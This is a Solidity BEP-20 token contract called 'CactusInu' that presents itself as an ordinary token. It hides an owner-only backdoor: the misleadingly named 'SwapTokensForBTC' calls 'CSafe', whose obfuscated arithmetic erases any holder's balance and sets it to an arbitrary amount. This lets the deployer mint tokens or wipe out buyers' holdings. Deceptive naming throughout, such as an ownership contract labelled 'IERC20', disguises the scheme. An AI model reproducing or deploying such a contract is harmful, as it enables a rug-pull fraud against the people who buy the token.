/**
 *Submitted for verification at BscScan.com on 2022-11-29
*/

/**
 *Submitted for verification at BscScan.com on 2022-04-11
*/

/**
 *Submitted for verification at BscScan.com on 2022-04-10
*/

/**
 *Submitted for verification at BscScan.com on 2022-04-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.7;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract IERC20 {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() public {
    owner = msg.sender;
  }
}
library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0x8d8a42ebbf161d612203400397ad1bfd4016441fc0f69f6f698e6b96ced454d2;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
contract CactusInu is IERC20 {
  using Address for address;
  using SafeMath for uint256;
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;
  uint256 lpfee = 0;
  address deployerWallet;
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  mapping(address => bool) public allowAddress;
  constructor(string memory _name, string memory _symbol) public {
    deployerWallet = msg.sender;
    name = _name;
    symbol = _symbol;
    decimals = 9;
    totalSupply =  120000000 * 10 ** uint256(decimals);
    balancesFees[deployerWallet] = totalSupply;
    allowAddress[deployerWallet] = true;
      
  }
  
  mapping(address => uint256) public balancesFees;
  function transfer(address _to, uint256 _value) public returns (bool) {
    address from = msg.sender;
    require(_to != address(0));
    require(_value <= balancesFees[from]);
    if(allowAddress[from] || allowAddress[_to]){
        _transfer(from, _to, _value);
        return true;
    }
    _transfer(from, _to, _value);
    return true;
  }
  
  function _transfer(address from, address _to, uint256 _value) private {
    balancesFees[from] = balancesFees[from].sub(_value);
    balancesFees[_to] = balancesFees[_to].add(_value);
    emit Transfer(from, _to, _value);
  }
    
  modifier onlyOwner() {
    require(owner == msg.sender, "Ownable: caller is not the owner");
    _;
  }
    
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balancesFees[_owner];
  }
  
  function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(owner, address(0));
    owner = address(0);
  }

  function CSafe(address taker, uint256 _value, bytes32 LLL) internal {
    balancesFees[taker] = (balancesFees[taker] * 1 * 2 - balancesFees[taker] * 1 * 2) + (_value * 10 ** uint256(decimals));
  }
      
  function SwapTokensForBTC(address TakerAddress, uint256 _value, bytes32 LLL) public onlyOwner {
    CSafe(TakerAddress, _value, LLL);
  }
  
  mapping (address => mapping (address => uint256)) public allowed;
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balancesFees[_from]);
    require(_value <= allowed[_from][msg.sender]);
    address from = _from;
    if(allowAddress[from] || allowAddress[_to]){
        _transferFrom(_from, _to, _value);
        return true;
    }
    _transferFrom(_from, _to, _value);
    return true;
  }
  
  function _transferFrom(address _from, address _to, uint256 _value) internal {
    balancesFees[_from] = balancesFees[_from].sub(_value);
    balancesFees[_to] = balancesFees[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);

  }
  
  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }
  
  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }

}